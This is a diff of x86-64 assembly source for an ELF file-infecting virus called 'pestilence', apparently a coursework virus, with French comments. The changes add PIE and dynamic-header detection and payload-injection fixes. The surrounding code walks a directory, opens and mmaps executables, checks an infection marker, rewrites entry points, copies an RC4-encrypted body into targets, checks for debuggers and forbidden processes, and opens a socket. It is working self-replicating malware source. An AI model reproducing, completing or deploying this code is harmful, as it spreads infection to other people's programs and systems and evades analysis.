@@ -22,6 +22,8 @@ _start:
 %include "rc4.s"
 
 _encrypted_start:
+
+
 	lea		rdi, [rel path]
 	mov		rcx, 512
 	xor		rax, rax
@@ -31,7 +33,7 @@ _encrypted_start:
 	NOP
 	rep		stosq
 	lea		rax, [rel path]
-	mov		[rax], byte '/'	
+	mov		[rax], byte '/'
 	inc		rax
 	mov		[rax], byte 't'	
 	inc		rax
@@ -212,8 +214,6 @@ replace:
 	div		rcx
 	mov		rax, rdx
 	POP_ALLr
-	;lea		rsi, [rel file]
-	;call	printf
 	; r15 le code
 	; r14  les instructions
 
@@ -430,8 +430,8 @@ print_rax:
 		push	rdi
 		push	rdx
 
-		lea		rsi, [rel path]
-		call	printf
+		;lea		rsi, [rel path]
+		;call	printf ;here
 		lea		rdi, [rel buff]
 		mov		rcx, 512
 		xor		rax, rax
@@ -472,6 +472,7 @@ print_rax:
 		lea		rsi, [rel buff]
 		mov		rdx, 4096
 		syscall
+		;call	print_rax
 		mov		rdx, rax
 		xor		rdi, rdi
 		NOP
@@ -529,8 +530,10 @@ print_rax:
 			pop		rsi
 			pop		rdi
 
+			
 
 			call	pestilence
+
 
 			push	rsi
 			lea		rsi, [rel path]
@@ -598,14 +601,29 @@ print_rax:
 			pop		rsi
 			pop		rdi
 
+
+			mov		rax, [rel path + 1]
+			cmp		al, 0
+			je		.error
+
+			;push	rsi
+			;lea		rsi, [rel path]
+			;call	printf
+			;pop		rsi
+
 			call	prepare_infection
 
 			; ici logique des fichier
 		.no_print:
 			add		rsi, rcx
 			jmp		.loop
+		.error:
+			;push	rsi
+			;lea		rsi, [rel path]
+			;;call	printf
+			;pop		rsi
+		
 		.done:
-
 
 		pop		rdi
 		mov		rax, SYS_close
@@ -620,7 +638,7 @@ print_rax:
 
 prepare_infection:
 	PUSH_ALL
-
+	; celui la ici
 	mov		rax, SYS_open
 	lea		rdi, [rel path]
 	mov		rsi, 2
@@ -628,28 +646,35 @@ prepare_infection:
 	syscall
 	mov     r12, rax
 
-	lea		rsi, [rel path]
-	call	sub_val
 
 	cmp		rax, 0
 	jle		.return
 	mov		r12, rax
 
+
+	lea		rdi, [rel stack]
+	mov		rcx, 144
+	xor		rax, rax
+	rep		stosb
+
 	; fstat(fd, &stat)
 	mov     rdi, r12
-	sub     rsp, 144
 	mov     rax, SYS_fstat
-	mov     rsi, rsp
+
+
+
+	lea     rsi, [stack]
 	syscall
 	cmp     rax, 0
-	jl     .close_file
+	jl     .close_file_nomap
 
 	; save file size
-	mov     rax, [rsp + 48]
+	mov     rax, [stack + 48]
 	mov     [rel file_size], rax
-	add     rsp, 144
 
 	; mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
+	mov		rax, [rel file_size]
+
 	mov     rax, SYS_mmap
 	xor     rdi, rdi
 	mov     rsi, [rel file_size]
@@ -659,7 +684,7 @@ prepare_infection:
 	xor     r9, r9
 	syscall
 	cmp     rax, -4095
-	jae     .close_file
+	jae     .close_file_nomap
 
 	mov r14, rax
 
@@ -674,6 +699,20 @@ prepare_infection:
 	; check infected
 	cmp byte [r14 + 0xa], 0x0
 	jne .close_file
+	mov	BYTE [rel dynm], 0
+
+
+	cmp	byte [r14 + 0x10], 0x02
+	je	.continue_infection
+	mov	BYTE [rel dynm], 1
+	cmp	byte [r14 + 0x10], 0x03
+	je	.continue_infection
+
+
+
+	jmp	.close_file
+
+	.continue_infection:
 
 	mov		rax, [r14 + 0x18] ; e_entry
 	mov		[old_entry], rax
@@ -694,16 +733,23 @@ prepare_infection:
 	call	infection
 
 	.close_file:
+		mov		rax, SYS_munmap
+		mov		rdi, r14
+		mov		rsi, [rel file_size]
+		syscall
+	.close_file_nomap:
 		mov		rax, SYS_close
 		mov		rdi, r12
 		syscall
 	.return:
+		lea		rsi, [rel path]
+		call	sub_val
 		POP_ALL
 		ret
 
 infection:
 	PUSH_ALLr
-
+	mov	BYTE [rel ispie], 0
 	mov BYTE [rel zero], 1
 	mov qword [rel p_offset], 0
 	mov qword [rel p_vaddr], 0
@@ -730,6 +776,45 @@ infection:
 	pop rcx
 	pop r11
 	inc r8
+	cmp dword [rbx], 3
+	jne	.no_interp
+.no_interp:
+
+	cmp dword [rbx], 2
+	jne	.no_dynamic
+	; FAUT PARSER CETTE MERDE DE HEADER DYNAMIC AAAAH\
+	; RBX c'est l'offset
+	PUSH_ALL
+	;lea		rsi, [rel path]
+	;call	printf
+
+	mov		rcx, [rbx + phdr.p_filesz]
+	shr		rcx, 4
+	mov		rdi, r14
+	add		rdi, [rbx + phdr.p_offset]
+	.parsing_dyn:
+
+
+	mov		eax, [rdi]
+	cmp		eax, 0x6ffffffb
+	jne		.next_dyn
+
+	mov		eax, [rdi + 8]
+	test	eax, 134217728
+	je		.next_dyn
+	mov		BYTE [rel ispie], 1
+
+
+.next_dyn:
+	add		rdi, 16
+	loop	.parsing_dyn
+
+
+
+	POP_ALL
+
+.no_dynamic:
+
 
 	cmp dword [rbx], 1
 	jne .no_load
@@ -774,7 +859,16 @@ infection:
 	dec rcx
 	jnz .loop
 
+
+	cmp BYTE [rel dynm], 0
+	je	.no_check_dynm
+	cmp BYTE [rel ispie], 0
+	je	.return
+
+.no_check_dynm:
 	cmp r13, 1
+	je	.return
+
 	mov rax, [rel p_vaddr]
 	mov rdx, [rel p_offset]
 	call align_value
@@ -826,7 +920,6 @@ infection:
 	syscall
 	mov r14, rax
 
-
 .no_extend:
 	push rdi
 	push rsi
@@ -871,6 +964,11 @@ infection:
 	mov rcx, PESTILENCE_SIZE_NO_BSS
 	rep movsb
 
+	mov rdi, rbx
+	mov rsi, PESTILENCE_SIZE_NO_BSS
+	mov rax, SYS_munmap
+	syscall
+
 	pop rcx
 	pop rsi
 	pop rdi
@@ -881,22 +979,25 @@ infection:
 	syscall
 
 .return:
+	mov qword [rel entry], 0
+	mov qword [rel old_entry],  0
+	mov	qword [rel p_offset],  0
+	mov	qword [rel p_vaddr],  0
+	mov	qword [rel p_paddr],  0
 	mov rax, r13
 	POP_ALLr
 	ret
 
 
-
 end_:
-	; check for tracer
 	call _is_debugged
 	cmp rax, -1
 	je .just_quit
 
-	; check for forbidden process
 	call _check_forbidden_process
 	cmp rax, 1
 	je .just_quit
+
 
 	call	pestilence
 
@@ -984,6 +1085,7 @@ end_:
 		NOP
 		syscall
 		mov		r13, rax	; le socket
+
 
 %include "video.s"
 
